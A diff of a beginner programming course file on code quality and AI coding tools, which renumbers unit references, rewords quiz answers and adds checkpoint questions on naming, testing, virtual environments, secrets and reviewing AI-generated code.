@@ -1,6 +1,6 @@
-/* Track 2 · Unit 10 · Code quality and AI coding tools */
+/* Track 2 · Unit 11 · Code quality and AI coding tools */
 ICA.addUnit({
-  id:"t2u10", track:"t2", n:10, title:"Code quality and AI coding tools", icon:"🧹",
+  id:"t2u10", track:"t2", n:11, title:"Code quality and AI coding tools", icon:"🧹",
   blurb:"The last unit of the track: habits that turn code that works into code people can trust. Write readable code, test it, keep projects tidy and secrets safe, and use AI coding tools as a careful reviewer would, so you stay the one who understands what your code does.",
   goals:[
     "Make code easier to read with clear names, small functions, sensible comments and docstrings, and let a formatter and a linter handle style and common slips",
@@ -36,6 +36,7 @@ ICA.addUnit({
         "**Easy to change**: a small change in what you want means a small change in the code.",
         "**Consistent**: the same things are done in the same way throughout the project."
       ]},
+      "Notice that “fast” isn’t on the list. Readable code is usually fast enough, and when speed does matter, measure before optimising: Unit 9, Lesson 4 shows how to time code and spot the parts that really grow slow ({{algorithm-efficiency}}).",
       "When code is hard to change because of earlier shortcuts, programmers call the extra cost **[[technical-debt|technical debt]]**. Like money borrowed, a little can be sensible to meet a deadline, but it grows if you never pay it back.",
       {key:"Write code for the next person who reads it. Very often, that person is you."}
     ]},
@@ -133,9 +134,9 @@ ICA.addUnit({
       {t:"`# Workaround: the scale sends weights in grams, not kg`", b:0, why:"A trap that future readers need to know about. Exactly what comments are for."}
     ]},
     {id:"t2u10-l1-x3", type:"mcq", q:"Tomás sees the same five lines that tidy up a postcode in two places in his script. A friend says “DRY! Make a function.” When is that **most** clearly the right call?", options:[
-      {t:"When both places tidy postcodes for the same reason, so a rule change should apply to both", ok:true, why:"Right. DRY is about one piece of knowledge living in one place. If the rule changes, one function means one change."},
+      {t:"When both places tidy postcodes for the same reason", ok:true, why:"Right. Then a rule change should apply to both. DRY is about one piece of knowledge living in one place. If the rule changes, one function means one change."},
       {t:"Whenever any two pieces of code look similar", why:"Look-alike code that changes for different reasons should often stay separate. Merging it couples things that aren’t really the same."},
-      {t:"Only when the repeated code is longer than 20 lines", why:"Length isn’t the test. Even a one-line rule repeated in many places is worth a name if it’s the same knowledge."},
+      {t:"Only when the repeated code is more than 20 lines long", why:"Length isn’t the test. Even a one-line rule repeated in many places is worth a name if it’s the same knowledge."},
       {t:"Never: copying is always safer than a function", why:"Copies drift apart: someone fixes one and forgets the other. That’s exactly the risk DRY prevents."}
     ]},
     {id:"t2u10-l1-x4", type:"match", q:"Match each tool or document with its job.", pairs:[
@@ -155,10 +156,10 @@ ICA.addUnit({
       {t:"Split the function in two, run it again, and commit", why:"The bigger change comes after the safe one, on its own, with its own check and commit."}
     ]},
     {id:"t2u10-l1-x7", type:"mcq", q:"Fatima’s script passes `ruff check` with no warnings and was formatted by Black. What does that tell her?", options:[
-      {t:"The layout is consistent and the linter found no common slips, but she still doesn’t know if the answers are right", ok:true, why:"Right. Formatters fix layout and linters spot patterns. Neither checks that the program does what it should; that needs tests and a human reader."},
+      {t:"It’s tidy, but she still doesn’t know if it’s right", ok:true, why:"Right. The layout is consistent and the linter found no common slips. Formatters fix layout and linters spot patterns. Neither checks that the program does what it should; that needs tests and a human reader."},
       {t:"The program is correct", why:"A linter reads code without running it, so it can’t know whether `total * 1.2` should have been `* 1.02`."},
       {t:"The program is secure", why:"Some linter rules spot risky patterns, but no clean lint report proves code is secure."},
-      {t:"Nothing at all: these tools are only cosmetic", why:"The linter does find real bugs, such as undefined names, and consistent layout makes reading easier. It just isn’t the whole story."}
+      {t:"Nothing at all: these tools are only cosmetic changes", why:"The linter does find real bugs, such as undefined names, and consistent layout makes reading easier. It just isn’t the whole story."}
     ]}
    ],
    apply:{intro:"Tidy a small script of your own (or the examples above) and try a real formatter and linter. Without a computer, you can still do the first and last tasks on paper or in the Python Lab.", tasks:[
@@ -199,17 +200,17 @@ ICA.addUnit({
       "A **unit test** checks one small piece, usually one function, on its own. Bigger tests check how pieces work together. This lesson stays with unit tests, the kind you’ll write most."
     ]},
     {h:"assert: a check in one line", body:[
-      "Python’s `assert` statement checks that something is true. If it is, nothing happens. If it isn’t, Python stops with an `AssertionError` and a [[traceback]] like the ones you read in Units 8 and 9.",
+      "Python’s `assert` statement checks that something is true. If it is, nothing happens. If it isn’t, Python stops with an `AssertionError` and a [[traceback]] like the ones you read in Units 8 and 10.",
       {code:['def split_bill(total, people):','    return round(total / people, 2)','','','assert split_bill(90, 3) == 30','assert split_bill(10, 3) == 3.33','assert split_bill(10, 4) == 2.5, "four people"','print("All checks passed")'].join("\n"), lang:"py", label:"Three checks", cap:"Prints `All checks passed`. Each **[[assertion]]** compares the actual answer with the expected one using `==`."},
       "The text after the comma is an optional message, shown if that check fails. Now suppose a bug creeps in: someone writes `//` (whole-number division) instead of `/`:",
       {code:['def split_bill(total, people):','    return total // people','','','assert split_bill(90, 3) == 30','assert split_bill(10, 4) == 2.5, "four people"','print("All checks passed")'].join("\n"), lang:"py", label:"With a bug"},
       {ex:"Traceback (most recent call last):\n  File \"assert_fail.py\", line 6, in <module>\n    assert split_bill(10, 4) == 2.5, \"four people\"\n           ^^^^^^^^^^^^^^^^^^^^^^^^\nAssertionError: four people", label:"What Python shows", mono:true},
       "The first check still passes (90 divides evenly by 3), which is exactly why one check is rarely enough. The second one catches the bug and points to the line.",
-      {tip:"Automate the Boring Stuff puts it simply: assertions are for **programmer** errors, not user errors. Don’t use `assert` to check what a user typed: Python can be run in a mode that skips asserts. Use `if` and a clear message for user input (Unit 9)."},
+      {tip:"Automate the Boring Stuff puts it simply: assertions are for **programmer** errors, not user errors. Don’t use `assert` to check what a user typed: Python can be run in a mode that skips asserts. Use `if` and a clear message for user input (Unit 10)."},
       {lab:"pl-test", t:"Practise: write `assert` tests for `average()`, including the empty list, then fix it"}
     ]},
     {h:"Your first pytest tests", body:[
-      "A bare list of asserts stops at the first failure and mixes tests with your program. **[[pytest]]** is a popular free tool that finds and runs tests for you and reports every result. It isn’t part of Python itself, so install it into your project’s virtual environment (Lesson 3 explains these): `python3 -m pip install pytest` (on Windows, `py -m pip install pytest`).",
+      "A bare list of asserts stops at the first failure and mixes tests with your program. **[[pytest]]** is a popular free tool that finds and runs tests for you and reports every result. It isn’t part of Python itself, so install it into your project’s virtual environment (for now just run the commands below; Lesson 3 explains what a virtual environment is): `python3 -m pip install pytest` (on Windows, `py -m pip install pytest`).",
       "Put the code in one file and the tests in another. pytest finds files named `test_*.py` (or `*_test.py`) and, inside them, functions whose names start with `test`:",
       {code:['def split_bill(total, people):','    """Return each share, rounded to 2 decimal places."""','    return round(total / people, 2)'].join("\n"), lang:"py", label:"bill.py"},
       {code:['from bill import split_bill','','','def test_even_split():','    assert split_bill(90, 3) == 30','','','def test_rounds_to_cents():','    assert split_bill(10, 3) == 3.33','','','def test_one_person_pays_all():','    assert split_bill(42.5, 1) == 42.5'].join("\n"), lang:"py", label:"test_bill.py"},
@@ -223,13 +224,14 @@ ICA.addUnit({
       {warn:"Work out the expected answer **yourself**, by hand or from the specification. If you copy whatever the code currently returns into the test, the test will happily confirm a bug."}
     ]},
     {h:"Edge cases: where bugs live", body:[
-      "Most bugs hide at the edges: the smallest and largest values, empty inputs, zero, one, and things that shouldn’t happen at all. Unit 9 called these **[[edge-case|edge cases]]**. For `split_bill`, good questions are:",
+      "Most bugs hide at the edges: the smallest and largest values, empty inputs, zero, one, and things that shouldn’t happen at all. Unit 10 called these **[[edge-case|edge cases]]**. For `split_bill`, good questions are:",
       {list:[
         "**Zero:** a total of 0? 0 people?",
         "**One:** one person pays everything.",
         "**Rounding:** amounts that don’t divide evenly.",
         "**Nonsense:** a negative number of people."
       ]},
+      "Listing edge cases like these before you write any code is part of {{algorithm-design|designing an algorithm}}, which Unit 9, Lesson 1 practises with pseudocode and trace tables.",
       "What should happen with 0 people? Right now Python crashes with `ZeroDivisionError`, which confuses whoever sees it. A clearer design is to refuse bad input with a message. `raise ValueError(\"…\")` stops the function with an error you choose:",
       {code:['def split_bill(total, people):','    """Return the share for each person, to 2 decimal places.','','    Raises ValueError if people is less than 1.','    """','    if people < 1:','        raise ValueError("people must be 1 or more")','    return round(total / people, 2)'].join("\n"), lang:"py", label:"bill.py, improved"},
       "pytest can check that an error **is** raised, using `pytest.raises` with a `with` block:",
@@ -303,7 +305,7 @@ ICA.addUnit({
       {v:33.333, tol:0.001, why:"The function rounds to 2 places, so the third decimal is dropped."}
     ]},
     {id:"t2u10-l2-x6", type:"mcq", q:"Dmitri’s `is_leap_year` passes tests for 2024 (leap) and 2023 (not leap). It’s just `year % 4 == 0`. What should he conclude?", options:[
-      {t:"Only that those two years work. He should add century years like 1900 and 2000, which follow a different rule", ok:true, why:"Right. Passing tests prove the tested cases. Century years are the edge case here, and 1900 would reveal the bug."},
+      {t:"Only that those two years work", ok:true, why:"Right. He should add century years like 1900 and 2000, which follow a different rule. Passing tests prove the tested cases. Century years are the edge case here, and 1900 would reveal the bug."},
       {t:"The function is correct, because the tests pass", why:"Tests only check the questions they ask. `is_leap_year(1900)` returns True, which is wrong."},
       {t:"Tests are useless for date code", why:"Tests are very useful here. These ones just need better cases."},
       {t:"He should delete the 2023 test because it isn’t a leap year", why:"Testing the “no” answer is as important as the “yes” answer. Keep it."}
@@ -319,7 +321,7 @@ ICA.addUnit({
    apply:{intro:"Write real tests for a function of your own. The first task works fully on a phone in the Python Lab; pytest needs a computer.", tasks:[
      {t:"Assert tests in the Python Lab", how:["Open **Labs → Python Lab** and, under “Fix it and test it”, choose **Write tests with assert**.","Write at least three `assert` lines for `average()`, including `assert average([]) == 0`. Press **▶ Run**: the empty-list test crashes with a `ZeroDivisionError`.","Fix the function so all your tests pass, then press **Check**. (**Hint** and **Show an answer** are there if you get stuck.)","For more practice, replace the code with `split_bill` from this lesson and write four asserts: a normal case, a rounding case, one person, and a total of 0. Use **▶ Run** for this part; **Check** only marks the `average()` challenge.","Change `split_bill` to introduce a bug (for example `//` instead of `/`) and run it again. Which assert caught it? Then press **Start again** if you want the original challenge back."], write:"Which of your asserts caught the bug, and which didn’t?"},
      {t:"Your first pytest run", how:{
-       win:["Make a folder `bill-test` with `bill.py` and `test_bill.py` from this lesson.","In PowerShell in that folder, create and activate a virtual environment: `py -m venv .venv`, then `.venv\\Scripts\\Activate.ps1` (Lesson 3 explains this).","Install pytest: `py -m pip install pytest`.","Run `py -m pytest`. Then add the improved `split_bill` and the two edge-case tests and run again."],
+       win:["Make a folder `bill-test` with `bill.py` and `test_bill.py` from this lesson.","In PowerShell in that folder, create and activate a virtual environment: `py -m venv .venv`, then `.venv\\Scripts\\Activate.ps1` (you only need these two commands for now; Lesson 3 explains what they do).","Install pytest: `py -m pip install pytest`.","Run `py -m pytest`. Then add the improved `split_bill` and the two edge-case tests and run again."],
        mac:["Make a folder `bill-test` with `bill.py` and `test_bill.py`.","In Terminal: `python3 -m venv .venv`, then `source .venv/bin/activate`.","`python3 -m pip install pytest`, then `python3 -m pytest`.","Add the improved `split_bill` and the edge-case tests, and run again."],
        chromeos:["In the Linux development environment’s Terminal, make the folder and the two files (a code editor such as VS Code can be installed there, or use `nano`).","`python3 -m venv .venv`, then `source .venv/bin/activate`, then `python3 -m pip install pytest`.","Run `python3 -m pytest`, then add the edge-case tests and run again."],
        phone:["pytest doesn’t run in the Python Lab, but plain asserts do. In a lab challenge, write each check as a function named `test_…`, then call them all at the end, followed by `print(\"All tests passed\")`.","That’s the same structure pytest uses; on a computer you’d simply delete the calls and run pytest."]
@@ -350,7 +352,7 @@ ICA.addUnit({
       {list:[
         "**Code** in one place (`src/`, or just the top folder for a single script).",
         "**Tests** in `tests/` (pytest finds them there), named `test_….py`.",
-        "**Data** in `data/`, and outputs in a separate folder, so a script never overwrites its own inputs ({{py-automation-safety|Unit 9’s safety habit}}).",
+        "**Data** in `data/`, and outputs in a separate folder, so a script never overwrites its own inputs ({{py-automation-safety|Unit 10’s safety habit}}).",
         "Names in lower case with hyphens or underscores and no spaces: they’re easier to type in a terminal (Unit 6)."
       ]}
     ]},
@@ -466,7 +468,7 @@ ICA.addUnit({
       {t:"CC BY 4.0", why:"Creative Commons doesn’t recommend its licences such as CC BY for software; software licences cover things like source code and patents."}
     ]},
     {id:"t2u10-l3-x7", type:"mcq", q:"Lucía added `.env` to `.gitignore`, but `git status` still shows `.env` as modified. Why?", options:[
-      {t:"Git already tracked `.env` before she ignored it; she needs `git rm --cached .env` and a commit", ok:true, why:"Right. `.gitignore` only affects untracked files. Once removed from the index, it stays ignored. And if `.env` held real secrets in earlier commits, she should rotate them."},
+      {t:"Git already tracked `.env` before she ignored it", ok:true, why:"Right. She needs `git rm --cached .env` and a commit. `.gitignore` only affects untracked files. Once removed from the index, it stays ignored. And if `.env` held real secrets in earlier commits, she should rotate them."},
       {t:"`.gitignore` needs a restart of the computer to take effect", why:"Git reads `.gitignore` every time it runs; no restart is involved."},
       {t:"The pattern should be `*.env*` to work", why:"`.env` matches the file exactly. The pattern isn’t the problem; the file was already tracked."},
       {t:"`.gitignore` only works on GitHub, not locally", why:"It’s used by Git itself on your computer, which is why `git status` respects it for untracked files."}
@@ -502,7 +504,7 @@ ICA.addUnit({
    learn:[
     {h:"Three kinds of AI coding tool", body:[
       {lead:"AI coding tools are built on large language models: programs trained on huge amounts of text and code to continue text in likely ways."},
-      "You met **large language models** and **[[generative-ai|generative AI]]** in Track 1. Trained on public code as well as prose, the same technology can write, explain and change code. An **[[ai-coding-assistant|AI coding assistant]]** is any tool that uses it to help you program. They come in three broad kinds, and many products now offer more than one:",
+      "You met **large language models** and **[[generative-ai|generative AI]]** in Track 1, and this lesson builds on Digital Foundations Unit 12, Lesson 4, on {{prompting-well|asking an AI assistant well}} and checking what comes back. Trained on public code as well as prose, the same technology can write, explain and change code. An **[[ai-coding-assistant|AI coding assistant]]** is any tool that uses it to help you program. They come in three broad kinds, and many products now offer more than one:",
       {table:[
         ["Kind","What it does","Examples"],
         ["Chat assistant","You describe a problem in a chat; it answers with explanations and code you copy","General AI chatbots such as ChatGPT, Claude, Gemini or Microsoft Copilot"],
@@ -536,7 +538,7 @@ ICA.addUnit({
       {ex:"I’m learning Python (3.12). Write a function average(scores) for a quiz app.\n- scores is a list of numbers; missing results are None and must be skipped.\n- 0 is a real score, not a missing one.\n- If there are no real scores, return None instead of crashing.\nExample: average([8, None, 6]) should return 7.\nUse only the standard library, add a docstring, keep it simple enough for a beginner, and explain each line. Then suggest pytest tests, including edge cases.", label:"A useful prompt", mono:true},
       "The second prompt contains the ingredients that matter:",
       {list:[
-        "**Context**: your level, the language and version, what the code is for, and (for real problems) the relevant code, trimmed to a [[minimal-example|minimal example]] as in Unit 9, and the **full** error message.",
+        "**Context**: your level, the language and version, what the code is for, and (for real problems) the relevant code, trimmed to a [[minimal-example|minimal example]] as in Unit 10, and the **full** error message.",
         "**Constraints**: rules it must follow, such as “standard library only”, “don’t change the other functions”, “keep the existing names”.",
         "**Examples**: an input and the expected output pin down what you mean better than any description.",
         "**A request to explain**, so you can learn from it and check its reasoning.",
@@ -593,7 +595,7 @@ ICA.addUnit({
       ["Mei asks a tool to “add a test and make it pass”; it edits two files and runs pytest","Coding agent","It acts on her project by itself: reading, editing and running commands."]
     ]},
     {id:"t2u10-l4-x2", type:"mcq", q:"Why can an AI assistant confidently suggest a function that doesn’t exist?", options:[
-      {t:"It generates text that looks likely from patterns, and a made-up name can look just as likely as a real one", ok:true, why:"Right. Unless it actually looks something up or runs the code, nothing checks that the name is real. That’s why you verify unfamiliar names in the documentation."},
+      {t:"A made-up name can look as likely as a real one", ok:true, why:"Right. It generates text that looks likely from patterns. Unless it actually looks something up or runs the code, nothing checks that the name is real. That’s why you verify unfamiliar names in the documentation."},
       {t:"It is deliberately testing whether you are paying attention", why:"The tool has no such intention. Invented names are a side effect of how text is generated."},
       {t:"The function existed but was deleted from Python yesterday", why:"Possible in rare version changes, but it doesn’t explain the general problem of invented names."},
       {t:"It only happens when the internet connection is slow", why:"Connection speed doesn’t change what the model generates."}
@@ -616,13 +618,13 @@ ICA.addUnit({
       {t:"def largest(numbers):", flag:false, why:"Fine: a clear name and parameter."}, "\n", {t:"    if not numbers:", flag:false, why:"Fine: checking for an empty list first is exactly right."}, "\n", {t:"        return 0", flag:true, why:"She asked for `None` for an empty list. Returning 0 looks like a real answer, so callers can’t tell “empty” from “the largest is 0”."}, "\n", {t:"    best = 0", flag:true, why:"Starting at 0 is wrong when every number is negative: `largest([-5, -2])` would return 0, which isn’t even in the list."}, "\n", {t:"    for n in numbers:", flag:false, why:"Fine: loops over each number."}, "\n", {t:"        if n > best:", flag:false, why:"The comparison itself is right; the problem is the starting value of `best`."}, "\n", {t:"            best = n", flag:false, why:"Fine: remembers the larger number."}, "\n", {t:"    return best", flag:false, why:"Fine once `best` starts correctly, for example as `numbers[0]`."}
     ]},
     {id:"t2u10-l4-x6", type:"mcq", q:"Dmitri is learning loops. He asks a chat assistant to write all of his practice exercises and pastes the answers in. They all run. What’s the most useful change he could make?", options:[
-      {t:"Try each exercise first, then ask for a hint or an explanation of what he got stuck on, and rewrite the solution himself", ok:true, why:"Right. The goal of practice is the skill, not the output. Hints and explanations keep him doing the thinking."},
+      {t:"Try each exercise first, then ask for hints", ok:true, why:"Right. Then ask for a hint or an explanation of what he got stuck on, and rewrite the solution himself. The goal of practice is the skill, not the output. Hints and explanations keep him doing the thinking."},
       {t:"Switch to a different AI tool that gives better answers", why:"Better answers don’t help if he isn’t practising. The problem is how he uses the tool, not which one."},
       {t:"Stop using AI tools completely, forever", why:"That’s one option, but the tools can be very good tutors when used for explanations and feedback."},
       {t:"Nothing: if the code runs, he has learned it", why:"Running code shows the tool can do loops. It says nothing about whether Dmitri can."}
     ]},
     {id:"t2u10-l4-x7", type:"mcq", q:"A coding agent asks Sione: “Run `python3 -m pytest`? (y/n)”. Then: “Edit 3 files? (y/n)”. What’s the responsible way to work with it?", options:[
-      {t:"Approve commands he understands, then read the full diff of the changed files and run the tests himself before committing", ok:true, why:"Right. Approval prompts are only a safeguard if he reads them, and reviewing the diff is how he knows what changed."},
+      {t:"Approve what he understands, and review the diff", ok:true, why:"Right. Approve commands he understands, then read the full diff of the changed files and run the tests himself before committing. Approval prompts are only a safeguard if he reads them, and reviewing the diff is how he knows what changed."},
       {t:"Turn off all approval prompts so it can work faster", why:"Running with no prompts lets mistakes (or instructions hidden in files) execute unchecked. Missing Semester advises isolating that mode in a container or virtual machine."},
       {t:"Approve everything; agents never run harmful commands", why:"Agents can and do propose wrong or risky commands. The prompt exists so a human can say no."},
       {t:"Refuse every request, so nothing can go wrong", why:"Then the tool can’t help at all. The point is to approve thoughtfully, not never."}
@@ -756,7 +758,7 @@ ICA.addUnit({
       {t:"Record it with its version in `requirements.txt`", why:"Everyone then installs the same checked package."}
     ]},
     {id:"t2u10-l5-x3", type:"mcq", q:"What is **slopsquatting**?", options:[
-      {t:"Publishing a harmful package under a name that AI tools tend to invent, waiting for people to install it", ok:true, why:"Right. It relies on AI tools repeating the same invented package names, which attackers can register."},
+      {t:"Using names AI tools invent for harmful packages", ok:true, why:"Right. Attackers publish a harmful package under a name that AI tools tend to invent, and wait for people to install it. It relies on AI tools repeating the same invented names."},
       {t:"Registering misspellings of popular package names", why:"That’s **typosquatting**, the older attack slopsquatting is named after. It relies on human typos, not AI inventions."},
       {t:"An AI tool that writes deliberately messy code", why:"“Slop” here refers to low-quality AI output, but slopsquatting is about invented package names being registered by attackers."},
       {t:"Leaving unused packages in `requirements.txt`", why:"That’s untidy, but not an attack. Slopsquatting is a supply-chain attack on invented names."}
@@ -777,7 +779,7 @@ ICA.addUnit({
       ["Your employer has a list of approved AI tools","Use only those tools for work code, with your work account","Approved tools come with agreements about how your data is handled."]
     ]},
     {id:"t2u10-l5-x7", type:"mcq", q:"An AI tool generates a sign-up form for Hana’s community group. It looks great. Which check is she **most** likely to need to do herself?", options:[
-      {t:"That each input has a proper label, buttons are real buttons, and it works with a keyboard", ok:true, why:"Right. Generated HTML often looks fine but skips accessibility basics. The checklist from Lesson 2 applies whoever wrote the page."},
+      {t:"That it has labels, real buttons and keyboard access", ok:true, why:"Right. Each input needs a proper label, buttons must be real buttons, and it must work with a keyboard. Generated HTML often looks fine but skips these accessibility basics. The checklist from Lesson 2 applies whoever wrote the page."},
       {t:"That the HTML file has the `.html` extension", why:"Easy to see and rarely the problem. Accessibility gaps are the common hidden issue."},
       {t:"That the colours match her favourite theme", why:"A matter of taste. Accessibility problems lock real people out."},
       {t:"Nothing: AI tools always follow accessibility standards", why:"They often don’t, unless asked, and even then the result needs checking."}
@@ -796,6 +798,20 @@ ICA.addUnit({
   }
   ],
   checkpoint:["t2u10-q02","t2u10-q05","t2u10-q08","t2u10-q11","t2u10-q14","t2u10-q19","t2u10-q22","t2u10-q26","t2u10-q29","t2u10-q33","t2u10-q36","t2u10-q39"],
+  cpBank:[
+    {id:"t2u10-cp01", lesson:"t2u10-l1", level:1, q:"Which name best fits a `True`/`False` value that says whether a volunteer has signed the safety form?", options:[{t:"`safety_form_record`", why:"That sounds like the form itself, not a yes-or-no answer about it."}, {t:"`HasSignedForm`", why:"In PEP 8, CapWords is for class names. Variables use snake case."}, {t:"`has_signed_form`", ok:true, why:"Yes-or-no values read best as questions, and PEP 8 writes variable names in lowercase with underscores."}, {t:"`bool1`", why:"Say what a name holds, not its type. `bool1` tells the reader nothing."}]},
+    {id:"t2u10-cp02", lesson:"t2u10-l1", level:2, q:"A comment says `# members get 10% off`, but the line below it is `price = price * 0.85`. What does PEP 8’s advice suggest?", options:[{t:"Fix it: a wrong comment is worse than no comment", ok:true, why:"Readers can’t tell which one is right. Check what the rule should be, then make the code and the comment agree."}, {t:"Leave it, because comments don’t change how code runs", why:"True for the computer, but people trust comments. A wrong one misleads the next reader."}, {t:"Delete every comment in the file", why:"Comments that explain why are valuable. Only the misleading one needs fixing."}, {t:"Run a formatter, which updates comments to match the code", why:"Formatters change layout only. They never check what a comment says."}]},
+    {id:"t2u10-cp03", lesson:"t2u10-l1", level:3, q:"Kemal wants to rename the variable `total` to `order_total` throughout a long script. Why is his editor’s **Rename symbol** command safer than find-and-replace?", options:[{t:"Find-and-replace can only change one line at a time", why:"It can change every line at once. That’s the danger: it also changes matches inside other names and strings."}, {t:"It won’t also change text such as `subtotal`", ok:true, why:"Rename symbol understands the code and changes each place the variable is used. Plain find-and-replace changes every match of those letters."}, {t:"Rename symbol writes new tests for the renamed variable", why:"It only renames. Running your checks afterwards is still up to you."}, {t:"Rename symbol commits the change to Git for him", why:"It doesn’t commit. Rename, run the checks, then commit yourself."}]},
+    {id:"t2u10-cp04", lesson:"t2u10-l2", level:2, q:"A user reports that `clean_name(\"o'brien\")` crashes. Following the lesson, what should Ines do first?", options:[{t:"Fix the code straight away and close the report", why:"Without a test she can’t be sure it’s fixed, and the bug could come back unnoticed."}, {t:"Wrap every call in `try`/`except` so nothing ever crashes", why:"Hiding the crash doesn’t fix the bug. A failing test pins it down first."}, {t:"Ask users not to type apostrophes in names", why:"Names with apostrophes are normal. The code should handle them, and a test should prove it does."}, {t:"Write a failing test for the bug, then fix the code", ok:true, why:"Fix the code until that test passes. This regression test proves the fix works and stops the same bug from quietly coming back later."}]},
+    {id:"t2u10-cp05", lesson:"t2u10-l2", level:3, q:"Fatima asks an AI assistant for pytest tests for her `split_bill` function. It gives six tests, each with an expected value. What should she do before trusting them?", options:[{t:"Nothing: if all six pass, the function is correct", why:"Passing only shows the code matches those values. If a value is wrong, the test confirms the bug instead of catching it."}, {t:"Delete any test that fails", why:"A failing test may be catching a real bug. Check its expected value first."}, {t:"Work out each expected value herself", ok:true, why:"Expected answers must come from the specification, not from the code or a tool. A wrong expected value would happily confirm a bug."}, {t:"Ask the assistant to run the tests for her", why:"Running them doesn’t check whether the expected values are right. That needs her own reasoning."}]},
+    {id:"t2u10-cp06", lesson:"t2u10-l2", level:3, q:"Mo’s `discount()` passes `ruff check`, was formatted by Black, and a coverage tool says his tests run 100% of its lines. What does he still **not** know?", options:[{t:"Whether it’s right for inputs his tests don’t check", ok:true, why:"Linters catch slips, formatters fix layout, and coverage shows which lines ran. None of them proves the answers are right for every input."}, {t:"Nothing: together these tools prove that it’s correct", why:"Each tool catches different problems. Even 100% coverage says nothing about untested inputs or a misunderstood requirement."}, {t:"Whether its layout follows PEP 8", why:"That’s exactly what the formatter took care of."}, {t:"Whether every line runs during the tests", why:"That’s exactly what 100% coverage tells him."}]},
+    {id:"t2u10-cp07", lesson:"t2u10-l3", level:1, q:"`api_key = os.environ.get(\"WEATHER_API_KEY\")`. What is `api_key` if that environment variable hasn’t been set?", options:[{t:"An empty string, `\"\"`", why:"It gives `None`, not an empty string, when the variable isn’t set."}, {t:"The text `WEATHER_API_KEY`", why:"That’s the variable’s name. `.get` returns its value, or `None` if there isn’t one."}, {t:"The script stops with a KeyError", why:"`.get` doesn’t raise a KeyError. It returns `None` instead."}, {t:"`None`", ok:true, why:"`os.environ.get` returns `None` for a variable that isn’t set, so the script can explain what’s missing."}]},
+    {id:"t2u10-cp08", lesson:"t2u10-l3", level:2, q:"Yesterday Ana made a `.venv`, activated it and installed `requests`. Today, in a new terminal window, `python3 app.py` fails with `ModuleNotFoundError: No module named 'requests'`. What’s the likely fix?", options:[{t:"Delete `.venv` and install everything again", why:"The environment is fine; it just isn’t active in this window."}, {t:"Activate `.venv` again in this terminal", ok:true, why:"Activation lasts only for one terminal window. Without it, the computer’s main Python runs, and `requests` isn’t installed there."}, {t:"Commit `.venv` to Git so it’s always there", why:"`.venv` should never be committed. It only needs activating."}, {t:"Run `python3 -m venv .venv` again", why:"That creates the environment but doesn’t activate it, so `python3` still means the computer’s main Python. Activate the existing `.venv` instead."}]},
+    {id:"t2u10-cp09", lesson:"t2u10-l4", level:1, q:"For which of these jobs is a chat-based AI assistant usually most reliable?", options:[{t:"Knowing exactly what you meant but didn’t say", why:"It only knows what’s in its context. Unstated wishes are one of its weak spots."}, {t:"Writing code for your company’s private library", why:"It has never seen private code unless you show it, so it may invent functions."}, {t:"Explaining what a common error message means", ok:true, why:"Common tasks, such as explaining a `TypeError`, appear often in its training data, so answers are usually good. Still check them."}, {t:"Guaranteeing that its own code is secure", why:"It may suggest unsafe patterns that still work. Security needs your own review."}]},
+    {id:"t2u10-cp10", lesson:"t2u10-l4", level:2, q:"An AI tool writes a function that passes all of Kofi’s tests, but its variables are called `a`, `b2` and `tmp`. What should he do before keeping it?", options:[{t:"Rename them clearly, and check he can explain each line", ok:true, why:"He’s responsible for every line he keeps. Clear names help the next reader, and explaining the code is part of the review loop."}, {t:"Keep it as it is, because passing tests means the review is done", why:"Testing is one step. Reading and understanding come before keeping, and unclear names make later changes harder."}, {t:"Run a formatter, which will choose better names", why:"Formatters change layout only, never names."}, {t:"Add a comment on each line saying what it does", why:"Comments that repeat the code are noise. Better names let the code explain itself."}]},
+    {id:"t2u10-cp11", lesson:"t2u10-l5", level:3, q:"Lena wants to try a coding agent on her project. Her `config.py` contains her real API key, written straight into the code. What should she change first?", options:[{t:"Nothing, because the agent will ask before it uses the key", why:"Agents can read any file they have access to. Asking before some actions doesn’t keep a secret out of what they read."}, {t:"Rename the variable from `KEY` to `SECRET_KEY`", why:"A new name doesn’t hide the value. The key is still in the file."}, {t:"Start the agent in her home folder so it has everything it needs", why:"That widens what it can read, including private files. Start it in the project folder only."}, {t:"Move the key into an environment variable or ignored `.env`", ok:true, why:"An agent can read any file it has access to, and what it reads may go to the provider. Keep secrets out of the files it will open, and start it in the project folder only."}]},
+    {id:"t2u10-cp12", lesson:"t2u10-l5", level:2, q:"An AI tool writes sign-up code that accepts only names made of the letters A to Z. Adébáyò Okoro and Seán O’Neil are both told their names are invalid. What does this show?", options:[{t:"The users typed their names wrongly", why:"Their names are correct. The code makes a false assumption about what names look like."}, {t:"Bias from training data: it assumes only unaccented letters", ok:true, why:"Models learn from existing code, blind spots included. Test generated code with real names, including accents and apostrophes."}, {t:"Names with accents can’t be stored in files on most computers", why:"UTF-8 stores every writing system. The limit is in the generated check, not in the computer."}, {t:"A linter would have caught this automatically", why:"Linters catch slips such as unused imports. A wrong assumption about names needs tests and human review."}]}
+  ],
   codex:[
    {id:"readable-code", title:"Readable code", aka:["code quality","clean code","DRY","technical debt","refactoring"], tags:["code quality","python","habits"],
     summary:"Code is read far more often than it is written, so good code is correct, clear, easy to change and consistent.",
@@ -1183,7 +1199,7 @@ ICA.addUnit({
   bank:[
    /* ---- Lesson 1 ---- */
    {id:"t2u10-q01", lesson:"t2u10-l1", level:1, q:"Why does readability matter, even though the computer runs messy code just as well?", options:[
-     {t:"Code is read many more times than it is written, by people who need to fix, change or trust it", ok:true, why:"PEP 8 starts from this idea. Every change means someone reading the code first."},
+     {t:"Code is read far more often than it is written", ok:true, why:"It’s read by people who need to fix, change or trust it. PEP 8 starts from this idea. Every change means someone reading the code first."},
      {t:"Messy code runs more slowly", why:"Layout and names make no difference to speed. Readability is for people."},
      {t:"Python refuses to run code that isn’t formatted", why:"Python only needs valid syntax and consistent indentation within blocks; it runs badly named code happily."},
      {t:"Readable code can’t contain bugs", why:"Readable code can still be wrong. It just makes bugs easier to find."}
@@ -1201,7 +1217,7 @@ ICA.addUnit({
      {t:"`# n is the number of people`", why:"This patches a poor name. Rename `n` to `people` and delete the comment."}
    ]},
    {id:"t2u10-q04", lesson:"t2u10-l1", level:1, q:"What does a formatter such as Black or `ruff format` do?", options:[
-     {t:"Rewrites layout (spaces, indents, line breaks) to a consistent style without changing behaviour", ok:true, why:"That’s why it’s safe to run on every save."},
+     {t:"Rewrites layout to a consistent style", ok:true, why:"It changes spaces, indents and line breaks without changing behaviour. That’s why it’s safe to run on every save."},
